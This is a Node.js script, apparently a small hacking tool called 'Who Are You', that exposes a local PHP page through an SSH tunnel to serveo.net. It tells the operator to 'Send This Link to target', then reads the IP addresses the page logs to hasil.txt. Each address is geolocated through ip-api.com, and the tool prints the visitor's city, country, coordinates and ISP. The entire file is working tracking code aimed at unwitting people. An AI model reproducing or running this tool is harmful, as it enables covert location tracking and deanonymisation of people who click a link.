//Please Don't Recode my program because i take a long time to complete this project
//Copyright© 2019 by Fajar Firdaus
var fs = require("fs");
var sh = require("shelljs");
var war = require("colors");
var r = require("readline");
var req = require("request");
var load = require("ora");
var box = require("boxen");
console.log(war.green(box("    [-=- About -=-]\n" + "[=====================]\n" + "Coder : Fajar Firdaus\n" + "FB : Fajar Firdaus\n" + "IG : fajar_firdaus_7\n" + "YT : iTech7732\n" + "Github : FajarTheGGman\n" + "[=====================]", {padding: 1})))
const ad = r.createInterface({
	input : process.stdin,
	output : process.stdout
});
console.log(war.green("\n[ Who Are You ] By Fajar Firdaus\n"));
var x = war.rainbow("Input Name Website : ");
sh.exec("php -S localhost:8888 > /dev/null 2>&1 &");
ad.question(x, (e) => {
sh.exec("ssh -o ServerAliveInterval=60 -R "+ `${e}` +":80:localhost:8888 serveo.net > /dev/null 2>&1 &");
console.log(war.blue("[>] Send This Link to target : " + `${e}` + "."  + "serveo.net"));
load("Listening...\n").start();
fs.watchFile("hasil.txt", function(current, previous){
var r = fs.readFileSync("hasil.txt", "utf8");
req("http://ip-api.com/json/" + r, function(error, response, body){
js = JSON.parse(body)
console.log(war.green("[IP] " + r));
console.log(war.rainbow("––––––––––––––––––"))
	console.log(war.blue("City : " + js["city"]));
	console.log(war.blue("Country : " + js["country"]));
	console.log(war.blue("IP : " + js["query"]));
	console.log(war.blue("Timezone : " + js["timezone"]));
	console.log(war.blue("Latitude : " + js["lat"]));
	console.log(war.blue("Longtitude : " + js["lon"]));
	console.log(war.blue("ISP : " + js["isp"]));
	console.log(war.rainbow("––––––––––––––––––\n"));
	console.log(war.red("[!] Type ctrl + c to exit\n"));
});
});
});